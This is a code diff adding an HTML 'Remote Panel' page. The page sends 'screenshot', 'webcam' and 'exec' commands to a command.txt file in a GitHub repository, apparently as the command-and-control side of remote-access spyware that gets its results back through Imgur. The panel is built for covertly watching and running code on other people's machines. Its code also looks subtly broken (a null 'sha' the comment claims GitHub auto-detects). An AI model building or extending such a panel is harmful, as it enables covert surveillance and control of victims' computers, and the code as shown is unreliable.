@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Control Panel</title>
+  <style>
+    body { background: #111; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
+    input, button { padding: 10px; font-size: 16px; margin: 10px; }
+    img { max-width: 90%; margin-top: 20px; border: 2px solid #fff; }
+  </style>
+</head>
+<body>
+  <h1>📡 Remote Panel</h1>
+  <input id="cmd" placeholder="Command (screenshot / webcam / exec:...)" />
+  <button onclick="sendCommand()">Send</button>
+  <br/>
+  <button onclick="showLastImage()">Show Last Result</button>
+  <pre id="log"></pre>
+  <img id="result" src="">
+
+<script>
+function sendCommand() {
+  const cmd = document.getElementById("cmd").value;
+  fetch("https://api.github.com/repos/YOUR_USERNAME/remote-control-panel/contents/command.txt", {
+    method: "PUT",
+    headers: {
+      "Authorization": "Bearer YOUR_GITHUB_TOKEN", // Create a token in GitHub Settings > Developer Settings
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      message: "update command",
+      content: btoa(cmd),
+      sha: null  // GitHub will auto-detect
+    })
+  }).then(res => res.json()).then(d => {
+    document.getElementById("log").textContent = "Command sent: " + cmd;
+  });
+}
+
+function showLastImage() {
+  alert("Check the console or your Imgur history. (We will auto-display soon)");
+}
+</script>
+</body>
+</html>
